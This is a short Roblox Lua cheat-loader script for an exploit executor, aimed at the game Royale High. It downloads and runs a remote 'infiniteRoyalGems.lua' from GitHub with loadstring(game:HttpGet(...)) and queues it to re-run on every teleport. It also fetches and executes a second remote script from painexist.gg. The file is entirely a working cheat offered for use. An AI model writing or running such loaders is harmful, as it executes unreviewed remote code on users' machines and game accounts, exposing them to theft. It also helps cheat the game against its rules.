game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.Started then
        if syn.queue_on_teleport~=nil then 
            syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ImLvna/RBLXScripts/main/infiniteRoyalGems.lua', true))()")
        else 
            queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ImLvna/RBLXScripts/main/infiniteRoyalGems.lua', true))()")
        end
    end
end)
wait(1)
loadstring(game:HttpGet('https://painexist.gg/api/royalehigh.lua', true))()
